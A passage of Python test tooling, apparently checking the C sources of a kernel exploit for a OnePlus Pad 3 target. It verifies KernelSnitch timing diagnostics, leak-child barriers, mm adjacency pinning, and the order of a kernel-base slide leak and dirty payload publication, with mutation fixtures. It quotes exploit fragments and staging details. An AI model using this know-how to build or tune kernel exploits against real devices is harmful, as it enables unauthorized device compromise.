            end = text.find("\n", index + 2)
            if end < 0:
                return -1
            index = end + 1
            continue
        if char == opening:
            depth += 1
        elif char == closing:
            depth -= 1
            if depth == 0:
                return index
            if depth < 0:
                return -1
        index += 1
    return -1


def _c_skip_post_signature_attributes(text: str, position: int) -> int:
    """Skip whitespace and GNU attributes between a signature and its body."""

    position = position
    while True:
        while position < len(text) and text[position].isspace():
            position += 1
        marker = "__attribute__"
        if not text.startswith(marker, position):
            return position
        position += len(marker)
        while position < len(text) and text[position].isspace():
            position += 1
        if position >= len(text) or text[position] != "(":
            return position
        end = _c_matching_delimiter(text, position, "(", ")")
        if end < 0:
            return position
        position = end + 1


def _c_body_after_name(text: str, name_start: int, name_end: int) -> str:
    position = name_end
    while position < len(text) and text[position].isspace():
        position += 1
    if position >= len(text) or text[position] != "(":
        return ""
    parameters_end = _c_matching_delimiter(text, position, "(", ")")
    if parameters_end < 0:
        return ""
    body_start = _c_skip_post_signature_attributes(text, parameters_end + 1)
    if body_start >= len(text) or text[body_start] != "{":
        return ""
    body_end = _c_matching_delimiter(text, body_start, "{", "}")
    if body_end < 0:
        return ""
    return text[body_start : body_end + 1]


@functools.lru_cache(maxsize=256)
def _c_function_body_cached(text: str, name: str) -> str:
    pattern = re.compile(rf"\b{re.escape(name)}\b")
    for match in pattern.finditer(text):
        body = _c_body_after_name(text, match.start(), match.end())
        if body:
            return body
    return ""


def c_function_body(source: str, name: str) -> str:
    """Extract one normalized C function body in linear time."""

    return _c_function_body_cached(normalized_source(source), name)


@functools.lru_cache(maxsize=64)
def _c_function_definitions_cached(text: str) -> tuple[tuple[str, str], ...]:
    control_keywords = {
        "if", "for", "while", "switch", "sizeof", "typeof", "_Alignof",
        "return", "case", "do",
    }
    functions: dict[str, str] = {}
    for match in re.finditer(r"\b([A-Za-z_]\w*)\b\s*\(", text):
        name = match.group(1)
        if name in control_keywords or name in functions:
            continue
        name_start, name_end = match.span(1)
        body = _c_body_after_name(text, name_start, name_end)
        if body:
            functions[name] = body
    return tuple(functions.items())


def c_function_definitions(source: str) -> dict[str, str]:
    """Extract normalized C function bodies keyed by function name."""

    return dict(_c_function_definitions_cached(normalized_source(source)))


def c_if_blocks(source: str, condition: str) -> list[str]:
    """Extract every normalized braced if block matching a condition regex."""

    text = normalized_source(source)
    result: list[str] = []
    pattern = re.compile(rf"\bif\s*\(\s*{condition}\s*\)\s*\{{")
    for match in pattern.finditer(text):
        start = text.find("{", match.start())
        end = _c_matching_delimiter(text, start, "{", "}")
        if end >= 0:
            result.append(text[start : end + 1])
    return result


def c_remove_if_blocks(source: str, condition: str) -> str:
    """Remove normalized braced if blocks matching a condition regex."""

    text = normalized_source(source)
    pattern = re.compile(rf"\bif\s*\(\s*{condition}\s*\)\s*\{{")
    result: list[str] = []
    cursor = 0
    while True:
        match = pattern.search(text, cursor)
        if not match:
            result.append(text[cursor:])
            return "".join(result)
        brace = text.find("{", match.start())
        end = _c_matching_delimiter(text, brace, "{", "}")
        if end < 0:
            result.append(text[cursor:])
            return "".join(result)
        result.append(text[cursor : match.start()])
        cursor = end + 1


def ordered_source_contract(
    text: str, needles: list[str], label: str, errors: list[str]
) -> None:
    position = 0
    for needle in needles:
        normalized = normalized_source(needle)
        found = text.find(normalized, position)
        if found < 0:
            errors.append(f"{label}: missing ordered source token {needle!r}")
            return
        position = found + len(normalized)


def source_find_any(text: str, needles: tuple[str, ...], start: int = 0) -> int:
    """Return the earliest normalized-source occurrence of any token."""

    positions = [
        text.find(normalized_source(needle), start)
        for needle in needles
    ]
    positions = [position for position in positions if position >= 0]
    return min(positions) if positions else -1


def source_rfind_any(text: str, needles: tuple[str, ...], end: int) -> int:
    """Return the latest normalized-source occurrence of any token before end."""

    positions = [
        text.rfind(normalized_source(needle), 0, end)
        for needle in needles
    ]
    positions = [position for position in positions if position >= 0]
    return max(positions) if positions else -1


def source_has_any(text: str, needles: tuple[str, ...]) -> bool:
    return source_find_any(text, needles) >= 0


def source_statement_around(text: str, position: int) -> str:
    start = text.rfind(";", 0, position) + 1
    brace = text.rfind("{", 0, position) + 1
    start = max(start, brace)
    end = text.find(";", position)
    if end < 0:
        end = len(text)
    return text[start : end + 1].strip()


def checked_call_statement(statement: str, call: str) -> bool:
    call_pos = statement.find(call)
    if call_pos < 0:
        return True
    prefix = statement[:call_pos]
    return (
        statement.startswith("if (")
        or statement.startswith("while (")
        or statement.startswith("return ")
        or "=" in prefix
    )


def c_direct_call_closure(
    functions: dict[str, str],
    roots: list[str],
    exempt: set[str],
) -> dict[str, str]:
    """Return the direct-call closure for roots, skipping fork-child-only funcs."""

    closure: dict[str, str] = {}
    pending = list(roots)
    while pending:
        name = pending.pop()
        if name in closure or name in exempt:
            continue
        body = functions.get(name)
        if body is None:
            continue
        closure[name] = body
        for call in re.findall(r"\b([A-Za-z_]\w*)\s*\(", body):
            if call in functions and call not in closure and call not in exempt:
                pending.append(call)
    return closure


def source_has_forbidden_call(text: str, token: str) -> bool:
    patterns = {
        "SYSCHK(": r"\bSYSCHK\s*\(",
        "pr_error(": r"\bpr_error\s*\(",
        "exit(": r"(?<![A-Za-z0-9_])exit\s*\(",
        "_exit(": r"(?<![A-Za-z0-9_])_exit\s*\(",
        "abort(": r"(?<![A-Za-z0-9_])abort\s*\(",
    }
    pattern = patterns.get(token)
    if pattern is None:
        return token in text
    return re.search(pattern, text) is not None


def pad3_kernelsnitch_diagnostic_contract_errors(
    sources: dict[str, str], diagnostic: object, evidence: object,
    evidence_sha256: str,
) -> list[str]:
    """Keep timing receipts observable while forbidding a cross-stage gate."""

    errors: list[str] = []
    if not isinstance(diagnostic, dict):
        return ["profile has no kernelsnitch_diagnostics object"]
    if not isinstance(evidence, dict):
        return ["profile has no KernelSnitch diagnostic evidence object"]

    expected_profile = {
        "status": "diagnostic-only-stage-mismatch-no-route-gate",
        "target_only_feature_macro": "PAD3_KERNELSNITCH_DIAGNOSTICS",
        "target_only_feature_value": 1,
        "counter": "cntvct_el0",
        "slide_log_placement": (
            "successful-slide-page-preparation-before-dirty-publication-and-pi-pselect"
        ),
        "route_gate": False,
        "reason": "historical-hit-miss-values-belong-to-fops-not-slide-stage",
        "waiter_ready_barrier": {
            "target_only_feature_macro": "PAD3_KERNELSNITCH_READY_BARRIER",
            "target_only_feature_value": 1,
            "waiters": 4096,
            "ready_publish": "atomic-release-before-futex-wait",
            "parent_observe": "atomic-acquire-exact-count",
            "timeout_ms": 10000,
            "final_same-core_yields": 1,
            "failure_policy": "clean-collisions-not-found-no-partial-scan",
        },
        "leak_child_start_barrier": {
            "target_only_feature_macro": "PAD3_KERNELSNITCH_CHILD_START_BARRIER",
            "target_only_feature_value": 1,
            "timeout_ms": 10000,
            "child_first_action": "shared-futex-park",
            "parent_release_after": (
                "post25-cloned-and-pre-leak-post-memfds-pinned"
            ),
            "purpose": (
                "exclude-kernelsnitch-4096-thread-startup-from-pre24-leak-"
                "post25-mm-adjacency-window"
            ),
            "failure_policy": "clean-pre-dirty-abort",
        },
        "evidence": "kernelsnitch-quality-evidence.json",
        "evidence_sha256": evidence_sha256,
    }
    for key, expected in expected_profile.items():
        if diagnostic.get(key) != expected:
            errors.append(f"kernelsnitch_diagnostics.{key} is not exact")

    expected_evidence = {
        "schema_version": 1,
        "target_id": "oneplus-pad3-ex-16.0.9.400",
        "counter": "cntvct_el0",
        "counter_rate": (
            "architected-fixed-rate-but-measured-latency-remains-dvfs-sensitive"
        ),
        "metric": "minimum accepted KernelSnitch collision traversal time",
        "policy": "diagnostic-only-no-route-gate",
        "conclusion": (
            "retain-per-stage-statistics-without-a-route-threshold-and-enforce-"
            "proven-four-send-head-waiter-ready-and-leak-child-start-barriers"
        ),
    }
    for key, expected in expected_evidence.items():
        if evidence.get(key) != expected:
            errors.append(f"KernelSnitch diagnostic evidence {key} is not exact")

    observations = evidence.get("observations")
    if not isinstance(observations, dict):
        errors.append("KernelSnitch diagnostic evidence has no observations")
    else:
        hits = observations.get("fops_route_hits")
        misses = observations.get("fops_route_misses")
        hit_values = (
            [item.get("accept_min") for item in hits if isinstance(item, dict)]
            if isinstance(hits, list)
            else []
        )
        miss_values = (
            [item.get("accept_min") for item in misses if isinstance(item, dict)]
            if isinstance(misses, list)
            else []
        )
        if hit_values != [
            14139, 13118, 13665, 12792, 13737, 13201, 13519, 11027
        ]:
            errors.append("FOPS-stage hit observations are not exact")
        if miss_values != [
            9536, 7124, 9970, 10512, 6909, 7076, 7609, 7450
        ]:
            errors.append("FOPS-stage miss observations are not exact")
        if observations.get("app_shizuku_slide_canary") != {
            "accept_min": 6647,
            "accept_max": 7079,
            "subsequent_fops_result": "route-miss",
        }:
            errors.append("paired app/Shizuku stage observations are not exact")
        if observations.get("clean_app_slide_diagnostics") != {
            "accept_min": [7423, 7448, 7561, 7536, 7620, 7480, 7490, 7635],
            "baseline_range": [7, 9],
            "reject_max_range": [9, 10],
            "fops_stage_observed": False,
            "dirty_marker_published": False,
        }:
            errors.append("clean SLIDE-only diagnostic observations are not exact")
        if observations.get("final_0010_paired_stages") != {
            "slide_accept_min": 7145,
            "slide_accept_max": 7205,
            "slide_result": "success",
            "fops_accept_min": 7076,
            "fops_accept_max": 7200,
            "fops_result": "route-miss",
            "fops_mm_slot": 17,
            "reclaim_sends": 12,
            "head_guard_free_heads": 4,
        }:
            errors.append("final 0010 paired-stage observation is not exact")

    if evidence.get("stage_mismatch") != {
        "historical_classifier_stage": "fops-page-preparation",
        "implemented_observation_stage": "slide-page-preparation",
        "paired_slide_outcome_dataset": False,
        "normalization_validates_collision_only": True,
        "route_decision_supported": False,
    }:
        errors.append("KernelSnitch stage-mismatch conclusion is not exact")
    if evidence.get("fops_stage_descriptive_separation") != {
        "minimum_hit": 11027,
        "maximum_miss": 10512,
        "gap": 515,
        "not_a_slide_classifier": True,
        "not_a_route_gate": True,
        "reason": (
            "timing remains diagnostic-only; allocator geometry is selected by "
            "route outcomes, with four-send at three hits in three observations "
            "versus one hit and multiple misses for twelve-send"
        ),
    }:
        errors.append("FOPS-stage descriptive separation is not exact")
    if evidence.get("waiter_pile_hardening") != {
        "previous_behavior": (
            "pthread-create-4096-followed-by-two-sched-yield-calls"
        ),
        "gap": (
            "the parent did not prove every worker reached the point immediately "
            "before FUTEX_WAIT, so collision traversal timing could observe an "
            "underfilled pile"
        ),
        "new_behavior": (
            "every worker release-publishes readiness immediately before "
            "FUTEX_WAIT; the parent acquire-waits for exactly 4096 under a "
            "monotonic deadline and yields once on inherited CPU0 before scanning"
        ),
        "timeout_ms": 10000,
        "failure_policy": "set-collisions-not-found-and-exit-child-cleanly",
        "route_threshold": False,
        "runtime_status": "pending-exact-device-rerun",
    }:
        errors.append("KernelSnitch waiter-pile hardening evidence is not exact")
    if evidence.get("leak_child_start_hardening") != {
        "observed_gap": (
            "clone_leak_child began KernelSnitch and its 4096 pthread startup "
            "concurrently with the parent post25 clone and later mm pin sequence"
        ),
        "allocator_effect": (
            "the intended pre24-leak-post25 exclusive mm_struct ownership window "
            "was scheduler-interleavable before the target slab peers were pinned"
        ),
        "new_sequence": (
            "pre24-clone, leak-child-clone-and-confirm-parked, post25-clone, "
            "pin-all-pre-leak-post-memfds, release-leak-child-to-KernelSnitch"
        ),
        "failure_policy": (
            "bounded-shared-futex-barrier-failure-aborts-clean-before-dirty-"
            "publication"
        ),
        "runtime_status": "pending-exact-device-rerun",
    }:
        errors.append("KernelSnitch leak-child start hardening evidence is not exact")

    normalized = {name: normalized_source(text) for name, text in sources.items()}
    target = normalized.get("target_raw", "")
    pmg_target = normalized.get("pmg_target_raw", "")
    common_raw = normalized.get("common_raw", "")
    kernelsnitch = normalized.get("kernelsnitch_raw", "")
    util = normalized.get("util", "")
    pipe = normalized.get("pipe", "")
    slide = c_function_body(sources.get("slide_raw", ""), "slide_leak_kernel_base")

    if "#define PAD3_KERNELSNITCH_DIAGNOSTICS 1" not in target:
        errors.append("Pad 3 target omits the exact KernelSnitch diagnostic feature")
    for name, source in (("common", common_raw), ("PMG", pmg_target)):
        if re.search(r"#define\s+PAD3_KERNELSNITCH_DIAGNOSTICS", source):
            errors.append(f"Pad 3 KernelSnitch diagnostic feature leaked into {name}")
        if re.search(r"#define\s+PAD3_KERNELSNITCH_READY_BARRIER", source):
            errors.append(f"Pad 3 KernelSnitch ready barrier leaked into {name}")
        if re.search(r"#define\s+PAD3_KERNELSNITCH_CHILD_START_BARRIER", source):
            errors.append(f"Pad 3 KernelSnitch child-start barrier leaked into {name}")
    for needle in (
        "#define PAD3_KERNELSNITCH_READY_BARRIER 1",
        "#define PAD3_KERNELSNITCH_READY_TIMEOUT_MS 10000",
        "#define PAD3_KERNELSNITCH_CHILD_START_BARRIER 1",
        "#define PAD3_KERNELSNITCH_CHILD_START_TIMEOUT_MS 10000",
    ):
        if needle not in target:
            errors.append(f"Pad 3 KernelSnitch ready barrier omits {needle!r}")
    forbidden_threshold = "PAD3_SLIDE_KERNELSNITCH_ACCEPT_MIN"
    if any(forbidden_threshold in source for source in normalized.values()):
        errors.append("obsolete cross-stage KernelSnitch threshold survived")

    for needle in (
        "volatile size_t collision_accept_min;",
        "volatile size_t collision_accept_max;",
        "volatile size_t collision_reject_max;",
        "ks->collision_accept_min = (accept_min == (size_t)-1) ? 0 : accept_min;",
        "ks->collision_accept_max = accept_max;",
        "ks->collision_reject_max = reject_max;",
    ):
        if needle not in kernelsnitch:
            errors.append(f"KernelSnitch shared diagnostic receipt omits {needle!r}")
    shared_mapping = (
        "struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, "
        "sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, "
        "MAP_ANON|MAP_SHARED, -1, 0));"
    )
    if shared_mapping not in kernelsnitch:
        errors.append("KernelSnitch diagnostic receipt state is not MAP_SHARED")

    # util is the Pad 3-preprocessed TU and therefore contains the header-only
    # KernelSnitch functions with target-only feature branches resolved.
    increase = c_function_body(util, "__increase")
    increase_worker = c_function_body(util, "__do_increase")
    find_collisions = c_function_body(util, "kernelsnitch_find_collisions")
    if "_Atomic size_t increase_ready;" not in kernelsnitch:
        errors.append("KernelSnitch waiter barrier omits shared atomic ready state")
    barrier_needles = (
        "atomic_fetch_add_explicit(&ks->increase_ready, 1, memory_order_release)",
        "int create_rc = pthread_create(&tid, 0, __do_increase",
        "if (create_rc != 0)",
        "atomic_load_explicit(&ks->increase_ready, memory_order_acquire)",
        "if (elapsed_ms >= timeout_ms)",
        "sched_yield();",
        "ready == amount && sched_getcpu() == 0",
        "Pad3 KernelSnitch waiter barrier ready=%zd/%zd",
    )
    barrier_source = " ".join((increase_worker, increase))
    for needle in barrier_needles:
        if needle not in barrier_source:
            errors.append(f"KernelSnitch waiter barrier omits {needle!r}")
    ordered_source_contract(
        increase_worker,
        [
            "atomic_fetch_add_explicit(&ks->increase_ready, 1, memory_order_release)",
            "FUTEX_WAIT_PRIVATE",
        ],
        "KernelSnitch worker ready-before-wait",
        errors,
    )
    ordered_source_contract(
        increase,
        [
            "for (size_t i = 0; i < amount; ++i)",
            "if (create_rc != 0)",
            "atomic_load_explicit(&ks->increase_ready, memory_order_acquire)",
            "sched_yield();",
            "ready == amount && sched_getcpu() == 0",
        ],
        "KernelSnitch exact waiter barrier",
        errors,
    )
    incomplete = find_collisions.find("if (!__increase(ks, ID, APPENDED_FUTEXES))")
    state_fail = find_collisions.find(
        "ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND", incomplete
    )
    return_fail = find_collisions.find("return;", state_fail)
    if min(incomplete, state_fail, return_fail) < 0 or not (
        incomplete < state_fail < return_fail
    ):
        errors.append("KernelSnitch incomplete waiter pile can continue scanning")
    if "ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND" not in kernelsnitch:
        errors.append("KernelSnitch incomplete waiter pile has no clean cleanup state")

    if "_Atomic uint32_t leak_child_start_state;" not in kernelsnitch:
        errors.append("KernelSnitch shared state omits leak-child start barrier")
    clone_leak = c_function_body(util, "clone_leak_child")
    prepare_page = c_function_body(util, "prepare_kernel_page")
    ordered_source_contract(
        clone_leak,
        [
            "pad3_leak_child_park_until_released()",
            "kernelsnitch_find_collisions(ks)",
        ],
        "KernelSnitch leak child park-before-scan",
        errors,
    )
    ordered_source_contract(
        prepare_page,
        [
            "pre_ctx.childs[i] = clone_child()",
            "child_leak = clone_leak_child()",
            "pad3_wait_leak_child_parked()",
            "post_ctx.childs[i] = clone_child()",
            "pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i])",
            "memfd_leak = open_memfd(child_leak)",
            "post_ctx.memfds[i] = open_memfd(post_ctx.childs[i])",
            "pad3_validate_leak_adjacency_pins()",
            "pad3_release_leak_child()",
            "kill_child(pre_ctx.childs[i])",
        ],
        "KernelSnitch exclusive pre/leak/post adjacency",
        errors,
    )
    for needle in (
        "if (!pad3_leak_child_park_until_released())",
        "if (!pad3_wait_leak_child_parked())",
        "pad3_validate_leak_adjacency_pins()",
        "atomic_store_explicit(&ks->leak_child_start_state, PAD3_LEAK_CHILD_START_PARKED, memory_order_release)",
        "atomic_load_explicit(&ks->leak_child_start_state, memory_order_acquire)",
        "FUTEX_WAIT",
        "FUTEX_WAKE",
        "PAD3_KERNELSNITCH_CHILD_START_TIMEOUT_MS",
        "atomic_compare_exchange_strong_explicit(",
        "Pad3 mm adjacency pins children=50/50 pins=50/50",
        "Pad3 KernelSnitch leak child released after post-mm pin exact=1",
        "Pad3 KernelSnitch leak child did not park; clean prepare abort",
        "Pad3 KernelSnitch leak child pin/release failed;",
    ):
        if needle not in util:
            errors.append(f"KernelSnitch leak-child barrier omits {needle!r}")
    if prepare_page.count("pad3_release_leak_child()") != 1:
        errors.append("KernelSnitch leak child is not released exactly once")
    pin_validation = c_function_body(util, "pad3_validate_leak_adjacency_pins")
    for needle in (
        "pre_ctx.childs[i] > 0",
        "pre_ctx.memfds[i] >= 0",
        "child_leak > 0",
        "memfd_leak >= 0",
        "post_ctx.childs[i] > 0",
        "post_ctx.memfds[i] >= 0",
        "valid_children != expected_children",
        "valid_pins != expected_pins",
        "PAD3_LEAK_CHILD_START_FAILED",
        "memory_order_release",
        "pad3_wake_leak_child_start()",
    ):
        if needle not in pin_validation:
            errors.append(
                f"KernelSnitch exact adjacency-pin validation omits {needle!r}"
            )
    if "int memfd_leak = -1;" not in sources.get("main_raw", ""):
        errors.append("KernelSnitch leak memfd does not use a closed sentinel")
    if "if (ctx->memfds[i] >= 0)" not in util:
        errors.append("KernelSnitch cleanup cannot close a valid fd zero")
    if prepare_page.count("pad3_abort_live_prepare_children()") != 2 or (
        prepare_page.count("ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND") < 2
    ):
        errors.append("KernelSnitch child barrier failures do not cleanly abort")

    pipe_prepare = c_function_body(pipe, "prepare_pipe_buffer_page_child")
    ordered_source_contract(
        pipe_prepare,
        [
            "setup_kernelsnitch()",
            "pre.memfds[i] = clone_memfd()",
            "leak_child = clone_leak_child()",
            "pad3_wait_leak_child_parked()",
            "post.memfds[i] = clone_memfd()",
            "leak_memfd = open(leak_path, O_RDONLY | O_CLOEXEC)",
            "if (leak_memfd < 0)",
            "pad3_release_leak_child()",
            "pipe_wait_child_exit_zero_checked(leak_child)",
            "kernelsnitch_collisions_ready()",
        ],
        "PIPE KernelSnitch park-pin-release lifecycle",
        errors,
    )
    if "Pad3 PIPE KernelSnitch leak child released after" not in pipe:
        errors.append("PIPE KernelSnitch lifecycle omits exact release receipt")
    pipe_exit_check = c_function_body(pipe, "pipe_wait_child_exit_zero_checked")
    for needle in ("waitpid(child, &status, 0)", "WIFEXITED(status)",
                   "WEXITSTATUS(status) == 0"):
        if needle not in pipe_exit_check:
            errors.append(f"PIPE KernelSnitch child exit check omits {needle!r}")

    for needle in (
        "last_kernel_page_ks_accept_min = 0;",
        "last_kernel_page_ks_accept_max = 0;",
        "last_kernel_page_ks_reject_max = 0;",
        "last_kernel_page_ks_accept_min = ks->collision_accept_min;",
        "last_kernel_page_ks_accept_max = ks->collision_accept_max;",
        "last_kernel_page_ks_reject_max = ks->collision_reject_max;",
        "size_t kernel_page_kernelsnitch_accept_min(void) { return "
        "last_kernel_page_ks_accept_min; }",
        "size_t kernel_page_kernelsnitch_accept_max(void) { return "
        "last_kernel_page_ks_accept_max; }",
        "size_t kernel_page_kernelsnitch_reject_max(void) { return "
        "last_kernel_page_ks_reject_max; }",
    ):
        if needle not in util:
            errors.append(f"kernel-page diagnostic attempt binding omits {needle!r}")

    prepare = c_function_body(util, "prepare_kernel_page")
    prepare_order = [
        prepare.find("last_kernel_page_ks_accept_min = 0"),
        prepare.find("ks = kernelsnitch_setup("),
        prepare.find("waitpid(child_leak, NULL, 0)"),
        prepare.find("last_kernel_page_ks_accept_min = ks->collision_accept_min"),
        prepare.find("kernelsnitch_found_collisions(ks)"),
    ]
    if min(prepare_order) < 0 or prepare_order != sorted(prepare_order):
        errors.append("KernelSnitch diagnostic is not bound to the exact attempt")
    producer = c_function_body(util, "clone_leak_child")
    producer_order = [
        producer.find("if (child == 0)"),
        producer.find("kernelsnitch_find_collisions(ks)"),
        producer.find("exit(0)"),
    ]
    if min(producer_order) < 0 or producer_order != sorted(producer_order):
        errors.append("clone_leak_child does not publish the diagnostic receipt")

    scope_start = slide.find("#if defined(PAD3_KERNELSNITCH_DIAGNOSTICS)")
    scope_end = slide.find("#endif", scope_start)
    dirty_publish = slide.find("if (!payload_publish_primitive_dirty())")
    if min(scope_start, scope_end, dirty_publish) < 0 or not (
        scope_start < scope_end < dirty_publish
    ):
        errors.append("SLIDE diagnostic is not Pad 3 scoped before dirty entry")
        diagnostic_block = ""
    else:
        diagnostic_block = slide[scope_start:scope_end]
    for needle in (
        "kernel_page_kernelsnitch_accept_min()",
        "kernel_page_kernelsnitch_accept_max()",
        "kernel_page_kernelsnitch_reject_max()",
        "Pad3 slide KernelSnitch diagnostic accepted=[%zu..%zu]",
        "slowest_rejected=%zu no-route-gate=1",
    ):
        if needle not in diagnostic_block:
            errors.append(f"SLIDE diagnostic block omits {needle!r}")
    for name in ("accept_min", "accept_max", "reject_max"):
        if diagnostic_block.count(name) != 3:
            errors.append(f"SLIDE diagnostic uses {name} outside declaration/logging")
        if slide.count(name) != diagnostic_block.count(name):
            errors.append(f"SLIDE route uses diagnostic {name} outside logging scope")
    if slide.count("kernel_page_kernelsnitch_") != diagnostic_block.count(
        "kernel_page_kernelsnitch_"
    ):
        errors.append("SLIDE route reads KernelSnitch diagnostics outside logging scope")
    for forbidden in (
        "return ",
        "continue",
        "close_reclaim_sockets",
        "cleanup_page_prepare_state",
        "payload_publish_primitive_dirty",
        "quality gate",
        "clean supervisor retry requested",
        "want-min",
    ):
        if forbidden in diagnostic_block:
            errors.append(f"SLIDE diagnostic became a route decision via {forbidden!r}")
    slide_order = [
        slide.find("prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE)"),
        slide.find("kernel_page_kernelsnitch_accept_min()"),
        slide.find("Pad3 slide KernelSnitch diagnostic accepted="),
        dirty_publish,
        slide.find("slide_child_leak_stext()"),
    ]
    if min(slide_order) < 0 or slide_order != sorted(slide_order):
        errors.append("SLIDE diagnostic ordering is not prepare < log < dirty < PI")
    return errors


def run_pad3_kernelsnitch_diagnostic_negative_fixtures(
    sources: dict[str, str], diagnostic: object, evidence: object,
    evidence_sha256: str,
) -> int:
    if pad3_kernelsnitch_diagnostic_contract_errors(
        sources, diagnostic, evidence, evidence_sha256
    ):
        raise RuntimeError("positive Pad 3 KernelSnitch diagnostic was rejected")

    mutations: dict[str, tuple[str, str, str]] = {
        "diagnostic-feature-disabled": (
            "target_raw",
            "#define PAD3_KERNELSNITCH_DIAGNOSTICS 1",
            "#define PAD3_KERNELSNITCH_DIAGNOSTICS 0",
        ),
        "ready-barrier-disabled": (
            "target_raw",
            "#define PAD3_KERNELSNITCH_READY_BARRIER 1",
            "#define PAD3_KERNELSNITCH_READY_BARRIER 0",
        ),
        "child-start-barrier-disabled": (
            "target_raw",
            "#define PAD3_KERNELSNITCH_CHILD_START_BARRIER 1",
            "#define PAD3_KERNELSNITCH_CHILD_START_BARRIER 0",
        ),
        "child-does-not-park": (
            "util",
            "if (!pad3_leak_child_park_until_released())",
            "if (0)",
        ),
        "parent-does-not-confirm-park": (
            "util",
            "if (!pad3_wait_leak_child_parked())",
            "if (0)",
        ),
        "child-release-before-post-pin": (
            "util",
            "post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);",
            "pad3_release_leak_child(); post_ctx.memfds[i] = "
            "open_memfd(post_ctx.childs[i]);",
        ),
        "pipe-child-does-not-confirm-park": (
            "pipe",
            "if (!pad3_wait_leak_child_parked())",
            "if (0)",
        ),
        "pipe-child-does-not-release": (
            "pipe",
            "if (!pad3_release_leak_child())",
            "if (0)",
        ),
        "pipe-child-exit-status-discarded": (
            "pipe",
            "waitpid(child, &status, 0)",
            "waitpid(child, NULL, 0)",
        ),
        "child-release-without-exact-pin-validation": (
            "util",
            "if (!pad3_validate_leak_adjacency_pins() ||",
            "if (0 ||",
        ),
        "valid-fd-zero-rejected": (
            "util",
            "valid_pins += pre_ctx.memfds[i] >= 0;",
            "valid_pins += pre_ctx.memfds[i] > 0;",
        ),
        "exact-pin-receipt-removed": (
            "util",
            "Pad3 mm adjacency pins children=50/50 pins=50/50",
            "Pad3 mm adjacency pins unchecked",
        ),
        "child-start-failure-cleanup-omitted": (
            "util",
            "pad3_abort_live_prepare_children();",
            "/* live prepare children left running */",
        ),
        "ready-release-removed": (
            "util",
            "atomic_fetch_add_explicit(&ks->increase_ready, 1, memory_order_release);",
            "/* ready release omitted */",
        ),
        "ready-not-release-published": (
            "util",
            "atomic_fetch_add_explicit(&ks->increase_ready, 1, memory_order_release);",
            "atomic_fetch_add_explicit(&ks->increase_ready, 1, memory_order_relaxed);",
        ),
        "pthread-create-syschk-restored": (
            "util",
            "int create_rc = pthread_create(&tid, 0, __do_increase,\n                                       (void *)inc_arg);",
            "int create_rc = SYSCHK(pthread_create(&tid, 0, __do_increase,\n                                       (void *)inc_arg));",
        ),
        "ready-timeout-removed": (
            "util",
            "if (elapsed_ms >= timeout_ms)",
            "if (0 && elapsed_ms >= timeout_ms)",
        ),
        "incomplete-pile-continues": (
            "util",
            "ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;\n        return;",
            "ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;\n        /* partial scan continues */",
        ),
        "obsolete-threshold-restored": (
            "target_raw",
            "#define PAD3_KERNELSNITCH_DIAGNOSTICS 1",
            "#define PAD3_KERNELSNITCH_DIAGNOSTICS 1\n"
            "#define PAD3_SLIDE_KERNELSNITCH_ACCEPT_MIN 12000",
        ),
        "shared-min-omitted": (
            "kernelsnitch_raw",
            "volatile size_t collision_accept_min;",
            "volatile size_t collision_accept_min_omitted;",
        ),
        "shared-state-not-shared": (
            "kernelsnitch_raw",
            "MAP_ANON|MAP_SHARED, -1, 0));",
            "MAP_ANON|MAP_PRIVATE, -1, 0));",
        ),
        "shared-min-not-published": (
            "kernelsnitch_raw",
            "ks->collision_accept_min =\n        "
            "(accept_min == (size_t)-1) ? 0 : accept_min;",
            "ks->collision_accept_min = 0;",
        ),
        "attempt-min-not-reset": (
            "util",
            "last_kernel_page_ks_accept_min = 0;",
            "last_kernel_page_ks_accept_min = last_kernel_page_ks_accept_min;",
        ),
        "attempt-min-not-bound": (
            "util",
            "last_kernel_page_ks_accept_min = ks->collision_accept_min;",
            "last_kernel_page_ks_accept_min = 0;",
        ),
        "collision-producer-omitted": (
            "util",
            "kernelsnitch_find_collisions(ks);\n    exit(0);",
            "/* KernelSnitch collision producer omitted */\n    exit(0);",
        ),
        "diagnostic-scope-removed": (
            "slide_raw",
            "#if defined(PAD3_KERNELSNITCH_DIAGNOSTICS) && \\\n+    PAD3_KERNELSNITCH_DIAGNOSTICS".replace("\\n+", "\\n"),
            "#if 1",
        ),
        "diagnostic-marker-removed": (
            "slide_raw",
            "no-route-gate=1",
            "route-gate-unknown",
        ),
        "cross-stage-if-gate-restored": (
            "slide_raw",
            "const size_t accept_max = kernel_page_kernelsnitch_accept_max();",
            "if (accept_min < 12000) return 0;\n    "
            "const size_t accept_max = kernel_page_kernelsnitch_accept_max();",
        ),
        "cross-stage-cleanup-return-restored": (
            "slide_raw",
            "slowest_rejected=%zu no-route-gate=1\\n\",",
            "slowest_rejected=%zu no-route-gate=1\\n\",\n"
            "            accept_min, accept_max, reject_max);\n"
            "    close_reclaim_sockets(); cleanup_page_prepare_state(); return 0;\n"
            "    pr_info(\"duplicate diagnostic",
        ),
        "cross-stage-gate-after-scope": (
            "slide_raw",
            "#endif\n    if (!payload_publish_primitive_dirty()) {",
            "#endif\n    if (accept_min < 12000) return 0;\n"
            "    if (!payload_publish_primitive_dirty()) {",
        ),
    }
    mutations["diagnostic-scope-removed"] = (
        "slide_raw",
        "#if defined(PAD3_KERNELSNITCH_DIAGNOSTICS)",
        "#if 1 /* diagnostic scope removed */",
    )
    for name, (source_name, old, new) in mutations.items():
        fixture = copy.deepcopy(sources)
        if old not in fixture[source_name]:
            raise RuntimeError(
                f"cannot construct Pad 3 KernelSnitch fixture {name}: {old!r}"
            )
        fixture[source_name] = fixture[source_name].replace(old, new, 1)
        if not pad3_kernelsnitch_diagnostic_contract_errors(
            fixture, diagnostic, evidence, evidence_sha256
        ):
            raise RuntimeError(
                f"negative Pad 3 KernelSnitch diagnostic fixture passed: {name}"
            )

    if not isinstance(diagnostic, dict) or not isinstance(evidence, dict):
        raise RuntimeError("cannot construct KernelSnitch diagnostic fixtures")
    profile_gate = copy.deepcopy(diagnostic)
    profile_gate["route_gate"] = True
    if not pad3_kernelsnitch_diagnostic_contract_errors(
